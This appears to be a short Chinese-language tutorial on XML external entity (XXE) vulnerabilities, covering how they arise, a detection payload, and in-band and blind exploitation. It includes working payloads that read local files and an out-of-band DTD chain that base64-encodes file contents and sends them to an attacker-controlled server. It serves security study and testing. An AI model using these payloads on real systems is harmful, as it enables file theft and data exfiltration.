### 一、漏洞原理
XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止对外部实体的加载，导致可加载 恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害
### 二、漏洞校验
```xml
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE ROOT [
<!ENTITY playwin "success">
]>
<root>&playwin;</root>
```
> 判定是否可以加载实体，如果可以加载即说明存在XXE漏洞。同时，也可以通过抓包工具对数据包进行判定。通过判定数据包的Content-Type:text/xml或Content-Type:application/xml的类型进行判定。

### 三、漏洞利用

1. 有回显
```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///d://test//test.txt">
]>
<x>&xxe;</x>
```
```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://127.0.0.1:81/test.dtd">
]>
<x>&xxe;</x>
```
> 因为结果会展示到页面，所以直接读取


2. 无回显
```xml
<!ENTITY % payload
"<!ENTITY &#x25; send SYSTEM 'http://192.168.0.102:81/test/index.php?data=%file;'>"
>
%payload;
```
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/test3.txt">
<!ENTITY % dtd SYSTEM "http://192.168.0.102:81/test/test.dtd">
%dtd;
%send;
]>
```
> 因为结果不会展示到页面，所以以发送请求的方式把数据发送到自己的服务器，由自己服务器进行接收

